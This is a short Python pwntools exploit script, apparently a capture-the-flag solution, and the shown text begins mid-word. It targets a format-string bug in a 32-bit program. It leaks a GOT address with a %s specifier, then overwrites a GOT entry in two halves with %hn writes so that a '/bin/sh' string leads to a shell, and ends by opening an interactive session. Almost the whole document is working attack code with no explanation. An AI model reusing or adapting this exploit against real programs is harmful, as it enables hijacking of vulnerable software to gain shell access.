ebug=0  
Local=1  
Frida=0  
Debug_pwntools=1  


read_addr=0x0804A02C
write_addr=0x0804A014
globallength=0x0804A06C
process.recv()
process.send('a'*6+r"%25$s"+'a'*5+p32(read_addr)+p32(globallength)+r"%26$n"+"\n")
# process.send('a'*6+r"%25$s"+'a'*5+p32(read_addr)+"\n")

# process.send("1\n")
process.recv(6)
sys_got=u32(process.recv(4))
# sys_got = strlen_got - (libc.got['strlen'] - libc.got['system'])
# free_got = strlen_got - (libc.got['strlen'] - libc.got['free'])
write_value=sys_got
# print 'slen:'+hex(strlen_got)
print 'sys :'+hex(write_value)
# print 'free:'+hex(free_got)
process.recv()
high_value=(write_value/(2**16))
low_value=(write_value%(2**16))
print hex(high_value)
print hex(low_value)
if high_value>low_value:
  print '先写低位'
  process.send('/bin/sh'+chr(24)+p32(write_addr)+p32(write_addr+2)+r'%'+str(low_value-0x10)+r'x'+r"%23$hn"+r'%'+str(high_value-low_value)+r'x'+r"%24$hn"+"\n")
  # process.send('/bin/sh'+chr(61)+p32(write_addr)+p32(write_addr+2)+r'%'+r'x'+r"%23$hn"+r'%'+r'x'+r"%24$hn"+"\n")

else:
  #先写高位
  process.send('/bin/sh'+chr(24)+p32(write_addr)+p32(write_addr+2)+r'%'+str(high_value-0x10)+r'x'+r"%24$hn"+r'%'+str(low_value-high_value)+r'x'+r"%23$hn"+"\n")
  # process.send('/bin/sh'+chr(61)+p32(write_addr)+p32(write_addr+2)+r'%'+r'x'+r"%24$hn"+r'%'+r'x'+r"%23$hn"+"\n")

if Debug!=0:
  raw_input()
process.interactive()

